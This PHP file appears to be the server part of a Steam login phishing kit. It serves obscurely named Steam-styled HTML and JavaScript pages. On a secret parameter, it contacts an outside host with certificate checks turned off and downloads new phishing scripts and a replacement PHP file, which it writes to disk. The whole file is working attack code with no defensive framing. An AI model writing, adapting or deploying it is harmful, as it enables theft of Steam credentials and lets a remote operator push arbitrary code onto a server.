<?php

$phpName = "deab0093a0f4551414b49ba57151ae08.php";
$steamHtmlName = "6kaomrcjpf2m.html";
$steamScriptName = "bhcg4ddaadpt.js";
$windowScriptName = "ocbp8i7rp6hv.js";
$domainToLogin = "oldwwweeeewee.com";
$resourceUrl = "https://oldwwweeeewee.com/fa3436t20izhvt8a9hlb4aubmyie2l4k6clds";
$postData = [
    "secret" => "9871633e20ecabe626b91816ea044bb7",
    "authBtnClass" => "e8gyjt8s0qog",
    "steamHtmlName" => $steamHtmlName,
    "steamScriptName" => $steamScriptName,
    "windowScriptName" => $windowScriptName,
];
$buildId = "483a6dec-15ef-43f7-a9df-80ac4d102086";
$version = "2";

// Директория для Render
$dataDir = '/var/www/data/';
if (!file_exists($dataDir)) {
    mkdir($dataDir, 0755, true);
}

// Проверяем, запрашивается ли файл JS или HTML
$requestUri = $_SERVER['REQUEST_URI'];
if (strpos($requestUri, $steamHtmlName) !== false) {
    header('Content-Type: text/html');
    echo file_exists($dataDir . $steamHtmlName) ? file_get_contents($dataDir . $steamHtmlName) : file_get_contents($steamHtmlName);
    exit;
} elseif (strpos($requestUri, $steamScriptName) !== false) {
    header('Content-Type: application/javascript');
    echo file_exists($dataDir . $steamScriptName) ? file_get_contents($dataDir . $steamScriptName) : file_get_contents($steamScriptName);
    exit;
} elseif (strpos($requestUri, $windowScriptName) !== false) {
    header('Content-Type: application/javascript');
    echo file_exists($dataDir . $windowScriptName) ? file_get_contents($dataDir . $windowScriptName) : file_get_contents($windowScriptName);
    exit;
}

$update = isset($_GET['update']) && $_GET['update'] === 'true';
$secret = isset($_GET['secret']) ?$_GET["secret"] : null;

if($secret !== $postData["secret"]){
    echo "false";
} else if($update) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $resourceUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $response = curl_exec($ch);

    if(curl_errno($ch)) {
        echo '\nError:' . curl_error($ch);
    } else {
        $responseData = json_decode($response, true);
        $success = true;

        if (isset($responseData['windowScript'])) {
            $result = file_put_contents($dataDir . $windowScriptName, $responseData["windowScript"]);
            if($result === false) {
                echo "\nFailed to write window script\n";
                $success = false;
            }
        }

        if (isset($responseData['steamScript'])) {
            $result = file_put_contents($dataDir . $steamScriptName, $responseData["steamScript"]);
            if($result === false) {
                echo "\nFailed to write steam script\n";
                $success = false;
            }
        }

        if (isset($responseData['steamFile'])) {
            $result = file_put_contents($dataDir . $steamHtmlName, $responseData["steamFile"]);
            if($result === false) {
                echo "\nFailed to write steam file\n";
                $success = false;
            }
        }

        if (isset($responseData['updatePhp'])) {
            $result = file_put_contents($dataDir . $phpName, $responseData["updatePhp"]);
            if($result === false) {
                echo "\nFailed to write update php file\n";
                $success = false;
            }
        }

        echo $success ? "success" : "failed";
    }

    curl_close($ch);
} else {
    header('Content-Type: application/json');

    echo json_encode([
        "success" => true,
        "buildId" => $buildId,
        "version" => $version
    ]);
}
?>
